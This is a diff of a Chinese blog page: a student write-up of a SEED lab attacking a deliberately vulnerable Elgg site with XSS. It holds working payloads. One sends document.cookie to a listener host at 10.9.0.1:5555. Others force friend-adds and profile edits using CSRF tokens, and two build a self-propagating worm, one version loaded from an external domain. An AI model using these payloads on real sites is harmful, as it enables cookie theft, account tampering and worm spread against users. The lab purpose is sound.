@@ -351,237 +351,195 @@
               <div class="markdown-body">
                 
                 <meta name="referrer" content="no-referrer" />
-<h1>Lab 7-XSS攻击实验(Elgg)</h1>
-<h3 id="实验环境">实验环境</h3>
-<ul>
+
+<h1 id="Lab-7-XSS攻击实验-Elgg"><a href="#Lab-7-XSS攻击实验-Elgg" class="headerlink" title="Lab 7-XSS攻击实验(Elgg)"></a>Lab 7-XSS攻击实验(Elgg)</h1><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
 <li>Ubuntu 20.04</li>
 </ul>
-<h3 id="实验内容">实验内容</h3>
-<p><s>删掉啦</s></p>
+<h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p><del>删掉啦</del></p>
 <!-- 跨站点脚本(XSS)是一种常见于web应用程序中的计算机安全漏洞。此漏洞使攻击者有可能将恶意代码（如JavaScripts）注入受害者的web浏览器。
 
 为了演示攻击者可以做什么，我们在预先构建的Ubuntu VM映像中设置了一个名为Elgg的web应用程序。我们已经注释掉了Elgg的一些保护方法，故意使其容易受到XSS攻击。学生们需要利用这些漏洞发动攻击，就像Samy Kamkar在2005年通过臭名昭著的Samy蠕虫对MySpace所做的那样。此攻击的最终目标是在用户之间传播XSS蠕虫，这样无论谁查看受感染的用户配置文件都会受到感染，无论谁受感染都会将您（即攻击者）添加到他/她的好友列表中。 -->
+
 <hr>
-<h3 id="实验步骤">实验步骤</h3>
-<h4 id="DNS-Setup">DNS Setup</h4>
-<ol>
-<li>
-<p>加载docker：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102041974.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102048386.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="DNS-Setup"><a href="#DNS-Setup" class="headerlink" title="DNS Setup"></a>DNS Setup</h4><ol>
+<li><p>加载docker：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102041974.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102048386.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>docker-compose build</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102053948.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>docker-compose build</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102053948.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>docker-compose up</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102059447.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>docker-compose up</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102059447.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>配置/etc/hosts，添加<code>www.seed-server.com</code>和一些测试网站的域名映射：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102105484.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>配置&#x2F;etc&#x2F;hosts，添加<code>www.seed-server.com</code>和一些测试网站的域名映射：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102105484.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>可以打开<code>www.seed-server.com</code>了</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102111620.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>可以打开<code>www.seed-server.com</code>了</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102111620.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window">Task 1: Posting a Malicious Message to Display an Alert Window</h4>
-<ol>
-<li>
-<p>以samy的身份登入网站，修改samy的profile，将攻击代码藏入简介中：</p>
+<h4 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h4><ol>
+<li><p>以samy的身份登入网站，修改samy的profile，将攻击代码藏入简介中：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102117809.png" srcset="/img/loading.gif" lazyload alt=""></p>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102117809.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>保存后就能看到弹窗：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102125770.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>保存后就能看到弹窗：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102125770.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>返回主页也能看到：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102132639.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>返回主页也能看到：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102132639.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <p><strong>攻击成功了！</strong></p>
 <hr>
-<h4 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies">Task 2: Posting a Malicious Message to Display Cookies</h4>
-<ol>
-<li>
-<p>修改samy中藏有的恶意代码，使其弹窗中显示cookie：</p>
+<h4 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h4><ol>
+<li><p>修改samy中藏有的恶意代码，使其弹窗中显示cookie：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102139768.png" srcset="/img/loading.gif" lazyload alt=""></p>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102139768.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>保存后弹窗中显示cookie：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102504056.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>保存后弹窗中显示cookie：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102504056.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine">Task 3: Stealing Cookies from the Victim’s Machine</h4>
-<ol>
-<li>
-<p>开启一个终端监听5555端口：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102511568.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h4><ol>
+<li><p>开启一个终端监听5555端口：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102511568.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>将samy的profile中的恶意代码修改成：</p>
+<li><p>将samy的profile中的恶意代码修改成：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)+<span class="hljs-string">&#x27;&gt;&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102517044.png" srcset="/img/loading.gif" lazyload alt=""></p>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102517044.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>保存后发现被拦截了，监听端口输出cookie：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102523473.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>保存后发现被拦截了，监听端口输出cookie：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102523473.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task-4-Becoming-the-Victim’s-Friend">Task 4: Becoming the Victim’s Friend</h4>
-<ol>
-<li>
-<p>samy添加一个好友，使用wireshark查看一下http的请求是怎么构建的：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102530885.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h4><ol>
+<li><p>samy添加一个好友，使用wireshark查看一下http的请求是怎么构建的：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102530885.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到其中的url请求是：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add?friend=58&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q<br></code></pre></td></tr></table></figure>
+
 <p>所以如果要加samy为好友，其id为59，则构造的url请求应该是：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add<span class="hljs-string">&quot;+&quot;</span>?friend=59<span class="hljs-string">&quot; + ts + token + ts + token</span><br></code></pre></td></tr></table></figure>
+
 <p>所以构造的恶意代码为：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> +</span><br><span class="language-javascript">            ts + token + ts + token;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 </li>
-<li>
-<p>修改samy profile中的恶意代码：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102539104.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>修改samy profile中的恶意代码：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102539104.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>更换Alice的账号登录，没有好友：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102544079.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>更换Alice的账号登录，没有好友：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102544079.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>访问samy的主页，然后发现就添加上了好友：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102549071.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102553978.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>访问samy的主页，然后发现就添加上了好友：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102549071.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102553978.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task-5-Modifying-the-Victim’s-Profile">Task 5: Modifying the Victim’s Profile</h4>
-<ol>
-<li>
-<p>修改一下samy自己的profile：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102558610.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h4><ol>
+<li><p>修改一下samy自己的profile：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102558610.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>抓包之后显示url请求为：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102604446.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>抓包之后显示url请求为：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102604446.png" srcset="/img/loading.gif" lazyload></p>
 <p>如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__elgg_token=CL1-xOOBucqcKcYnoGR1Sg&amp;__elgg_ts=1732702506&amp;name=Samy&amp;description=&lt;p&gt;This is samy.&lt;/p&gt; &amp;accesslevel[description]=2&amp;briefdescription=&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=59<br></code></pre></td></tr></table></figure>
+
 <p>所以得到了构造的恶意代码：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        var userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        var guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        var ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        var token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        var content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=&lt;p&gt;This is from samy.&lt;/p&gt;&amp;accesslevel[description]=2&quot;</span>+guid;<br>        var samyGuid=59;<br>        var sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            var Ajax=null;<br>            Ajax=new XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 </li>
-<li>
-<p>修改samy的profile中的恶意代码如下：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102611325.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>修改samy的profile中的恶意代码如下：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102611325.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>alice登录后，访问samy的主页也会修改</p>
+<li><p>alice登录后，访问samy的主页也会修改</p>
 <p>before：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102616149.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102616149.png" srcset="/img/loading.gif" lazyload></p>
 <p>访问samy后：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102620748.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102620748.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <p><strong>攻击成功了！</strong></p>
 <hr>
-<h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm">Task 6: Writing a Self-Propagating XSS Worm</h4>
-<h5 id="Link-Approach">Link Approach</h5>
-<ol>
-<li>
-<p>使用之前搭建好的<code>www.example32.com</code>作为第三方服务器：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102627239.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="Task 6: Writing a Self-Propagating XSS Worm"></a>Task 6: Writing a Self-Propagating XSS Worm</h4><h5 id="Link-Approach"><a href="#Link-Approach" class="headerlink" title="Link Approach"></a>Link Approach</h5><ol>
+<li><p>使用之前搭建好的<code>www.example32.com</code>作为第三方服务器：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102627239.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>进入apache2中的配置文件，插入<code>www.example32.com</code>的服务器名字：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102633236.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>进入apache2中的配置文件，插入<code>www.example32.com</code>的服务器名字：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102633236.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>在容器中的<code>/var/www/csp</code>文件夹中，创建<code>xssworm.js</code>文件，将上个task中js代码中的内容复制进来，加上wormCode变量，注意使用的域名：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102638452.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>在容器中的<code>/var/www/csp</code>文件夹中，创建<code>xssworm.js</code>文件，将上个task中js代码中的内容复制进来，加上wormCode变量，注意使用的域名：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102638452.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>访问<code>www.example70.com/xssworm.js</code>可以访问到js代码：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102643368.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>访问<code>www.example70.com/xssworm.js</code>可以访问到js代码：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102643368.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>将samy中profile的恶意代码改成</p>
+<li><p>将samy中profile的恶意代码改成</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script  type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;http://www.example70.com/xssworm.js&quot;</span>&gt;&lt;/script&gt; <br></code></pre></td></tr></table></figure>
 </li>
-<li>
-<p>以boby的身份登录，在没有点进samy主页之前：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102649007.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>以boby的身份登录，在没有点进samy主页之前：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102649007.png" srcset="/img/loading.gif" lazyload></p>
 <p>点进之后：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102658741.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102658741.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>而以charlie的身份访问boby，也会被攻击：</p>
+<li><p>而以charlie的身份访问boby，也会被攻击：</p>
 <p>before：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102705199.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102705199.png" srcset="/img/loading.gif" lazyload></p>
 <p>访问boby之后：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102711947.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102711947.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <p><strong>说明蠕虫攻击成功了！</strong></p>
 <hr>
-<h5 id="DOM-Approach">DOM Approach</h5>
-<ol>
-<li>
-<p>将samy的profile中的恶意代码修改如下：</p>
+<h5 id="DOM-Approach"><a href="#DOM-Approach" class="headerlink" title="DOM Approach"></a>DOM Approach</h5><ol>
+<li><p>将samy的profile中的恶意代码修改如下：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);<br>    <br>    <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>    <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br><br>    <span class="hljs-keyword">var</span> content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=This is from samy&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + guid;<br>    <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>    &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102720231.png" srcset="/img/loading.gif" lazyload alt=""></p>
+
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102720231.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>alice的简介清除之后，访问samy主页，攻击成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102726794.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>alice的简介清除之后，访问samy主页，攻击成功：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102726794.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>boby的简介清除之后，访问alice主页，也可以攻击成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102731701.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>boby的简介清除之后，访问alice主页，也可以攻击成功：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102731701.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <p><strong>说明蠕虫攻击再次实现了！</strong></p>
 <hr>
-<h4 id="Task-7-Defeating-XSS-Attacks-Using-CSP">Task 7: Defeating XSS Attacks Using CSP</h4>
-<ol>
-<li>
-<p>原始状态</p>
